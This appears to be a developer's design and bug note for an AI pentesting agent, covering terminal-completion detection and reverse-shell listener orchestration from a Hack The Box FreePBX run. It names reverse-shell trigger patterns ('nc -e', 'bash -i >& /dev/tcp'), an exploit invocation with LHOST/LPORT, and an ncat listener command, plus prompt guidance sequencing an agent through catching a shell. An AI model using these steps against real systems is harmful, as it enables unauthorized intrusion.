# Terminal completion detection + reverse-shell listener orchestration (2026-06-29)

Two bugs from a live run (qwen3.6-think, FreePBX RCE on 10.129.23.41):

1. **The agent can't tell a command finished.** After `ls -la /etc/sangoma/` returned
   (prompt back in the terminal), the model looped `terminal_read {wait_ms:10000}` →
   `{15000}` "waiting for it to complete." It already had. So it hangs the run on a
   finished command.
2. **Reverse-shell listener not orchestrated.** The model fired
   `exploit.py --lhost 10.10.15.223 --lport 4444` (a reverse shell) but it's unclear a
   Windows-side listener (`ncat.exe -lvp 4444`, per Environment settings) was ever
   started — so the payload connects to nothing and `terminal_run` reports
   `no_output_yet` forever.

---

## Root causes (verified in code)

- `terminalReadTool.Run` ([interactive_terminal_tool.go:314]) returns
  `formatTerminalScreen` only — **no state/completion signal**. The model polls and
  gets a raw screen with no "the prompt is back, it's done" hint.
- `classifyTerminalState` ([interactive_terminal_tool.go:143]) returns
  `no_output_yet` whenever `afterLen <= beforeLen` — i.e. no *new* lines since the
  command was sent — **before ever checking for a shell prompt**. A finished command
  with a prompt already on screen is mislabeled "still waiting." The hint then says
  "do not repeat the command yet," which steers the model into an infinite wait.
- No guard ties a reverse-shell-launching command to the configured listener
  (`Environment.ListenerBackend` = windows_powershell, `ListenerCommand` =
  `ncat.exe -lvp {port}`). The reverse-shell guidance exists as prose only
  ([app.go:~6353]) and isn't enforced or sequenced.

---

## Part A — Completion detection (P0) — DONE 2026-06-29

Also fixed a related bug found in the same screenshot: **`terminal_run`/`terminal_send`
bypassed command normalization**, so HTML entities leaked into the shell
(`ls ... 2>&amp;&gt;1`). Both now run `tools.PrepareShellCommand` /
`NormalizeShellCommandText` (un-escape + protected-path guard + scan hygiene).

- [x] **A1. `terminal_read` reports state.** Give `terminalReadTool.Run` the same
  `classifyTerminalState` + `terminalStateHint` header that `terminal_run` produces,
  so every poll tells the model `prompt_or_idle` / `running` / `interactive_prompt`.
  (Compute `beforeLen=0`/full-screen classification since read has no "command".)
- [x] **A2. Prompt detection wins over `no_output_yet`.** Reorder
  `classifyTerminalState`: check for a trailing shell prompt on the **full visible
  tail** first. If the last non-empty, non-art line is a shell prompt →
  `prompt_or_idle` (finished), even when `afterLen == beforeLen`. Only return
  `no_output_yet` when there is genuinely no output **and** no prompt.
- [x] **A3. Sharper prompt regex.** Match real Kali/WSL prompts
  (`root@host:~/path# `, `user@host:/x$ `) robustly, tolerate trailing spaces, and
  ignore blank/art trailing lines when locating the last line.
- [x] **A4. Hints that end the wait loop.** `prompt_or_idle` →
  "the previous command has FINISHED (shell prompt is back); proceed to the next
  step — do NOT call terminal_read again to wait." Soften the `no_output_yet` hint so
  it doesn't imply "keep waiting forever"; cap it ("if still empty after one more
  short read, the command may be blocked — check whether it needs a listener/input").
- [ ] **A5. Stall signal.** When two consecutive reads show no change AND no prompt,
  return a distinct `stalled` state hinting the command may be blocked on input or a
  missing listener (ties into Part B).
- [ ] Tests for each state transition in `classifyTerminalState` + the read header.

## Part B — Reverse-shell listener orchestration (P1, needs a small design)

The agent has ONE shared terminal session, but a reverse shell needs a **persistent
listener** running while the payload is fired. Options, recommended first:

- [x] **B1. `start_listener` capability (recommended).** A tool/helper that launches
  the configured `ListenerCommand` on `ListenerBackend` **detached** (Windows:
  `Start-Process ncat.exe -ArgumentList '-lvp <port>'`, or a background job) and
  returns immediately with the port and a handle. The caught shell's I/O surfaces via
  a background job log the agent can `terminal_read`/poll. Keeps the shared terminal
  free to fire the exploit.
- [x] **B2. Listener-first guard.** Pre-tool rule: detect a reverse-shell trigger
  (`--lport`/`--lhost`, `nc -e`, `msfvenom ... reverse`, `bash -i >& /dev/tcp`) and,
  if no listener was started this run, block/nudge: "Start the listener first:
  `<ListenerCommand>` via start_listener (LHOST `<vpn ip>`, port `<n>`), confirm it is
  listening, then fire the payload." Mirrors `repeatedShell*Block` structure.
- [~] **B3. LHOST/port consistency check.** Warn when the payload's `--lhost`/`--lport`
  don't match the started listener (or the selected VPN interface from
  `LHOSTSource`), e.g. exploit says 4444 but listener is on 9001.
- [x] **B4. Strengthen system guidance.** Make the reverse-shell flow explicit and
  ordered in the prompt: (1) start Windows listener, (2) confirm listening,
  (3) fire payload, (4) catch shell, (5) interact via terminal_send. Reinforce
  `PreferTerminalTools` + `ListenerBackend=windows_powershell` are authoritative.
- [x] **B5. Hanging-payload detection.** When a reverse-shell command sits at
  `no_output_yet`/`stalled` past a threshold, surface: "payload may be waiting for a
  connection — verify the listener is running and LHOST/port match," instead of the
  model silently re-reading.

## Verify

```
go build ./... && go test ./internal/app/ ./internal/tools/
```
Plus a live HTB run: confirm (a) the agent recognizes a finished command and moves on
(no terminal_read wait-loop), and (b) it starts the Windows ncat.exe listener before
firing a reverse shell and catches it.

## Priority

A (completion detection) first — it's the immediate "it finished ages ago" bug, small,
and model-agnostic (bit qwen too). B (listener orchestration) second — bigger, needs
the start_listener design decision.
